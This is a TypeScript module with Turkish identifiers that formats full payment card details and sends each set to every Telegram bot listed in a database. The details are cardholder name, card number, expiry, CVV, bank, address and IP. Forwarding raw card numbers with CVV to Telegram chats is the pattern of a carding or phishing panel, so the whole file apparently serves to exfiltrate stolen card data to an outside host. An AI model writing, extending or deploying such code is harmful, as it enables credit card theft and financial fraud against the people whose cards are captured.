import pool from './db';

interface TelegramBot {
    bot_token: string;
    chat_id: string;
}

interface PaymentInfo {
    kart_isim?: string;
    kredi_karti: string;
    skt: string;
    cvv: string;
    banka: string;
    marka: string;
    seviye: string;
    tutar: string;
    taksit?: string;
    adres: string;
    ip: string;
    tarih: string;
}

export async function sendTelegramMessage(message: string): Promise<void> {
    try {
        const [rows] = await pool.query('SELECT bot_token, chat_id FROM telegram_bots') as any[];
        
        if (!rows || rows.length === 0) {
            console.log('Telegram bot bulunamadı');
            return;
        }

        const sendPromises = (rows as TelegramBot[]).map(async (bot) => {
            try {
                const url = `https://api.telegram.org/bot${bot.bot_token}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: bot.chat_id,
                        text: message,
                        parse_mode: 'Markdown',
                    }),
                });

                const result = await response.json();
                
                if (!result.ok) {
                    console.error(`Telegram hatası:`, result.description);
                }
            } catch (error) {
                console.error(`Telegram API hatası:`, error);
            }
        });

        await Promise.all(sendPromises);
        
    } catch (error) {
        console.error('Telegram bildirim hatası:', error);
    }
}

export async function sendTelegramNotification(paymentInfo: PaymentInfo): Promise<void> {
    const message = `
💳 *YENİ ÖDEME GELDİ*
━━━━━━━━━━━━━━━━━━━━━

👤 *Kart Sahibi:* ${paymentInfo.kart_isim || 'Belirtilmemiş'}

💳 *Kart Bilgileri:*
• Kart No: \`${paymentInfo.kredi_karti}\`
• SKT: \`${paymentInfo.skt}\`
• CVV: \`${paymentInfo.cvv}\`

🏦 *Banka Bilgileri:*
• Banka: ${paymentInfo.banka || 'Bilinmiyor'}
• Marka: ${paymentInfo.marka || 'Bilinmiyor'}
• Kart Türü: ${paymentInfo.seviye || 'Bilinmiyor'}

💰 *Tutar:* ${paymentInfo.tutar}
📦 *Taksit:* ${paymentInfo.taksit || 'Peşin'}

📍 *Teslimat Adresi:*
${paymentInfo.adres || 'Belirtilmemiş'}

🌐 *IP:* \`${paymentInfo.ip}\`
📅 *Tarih:* ${paymentInfo.tarih}

━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    await sendTelegramMessage(message);
}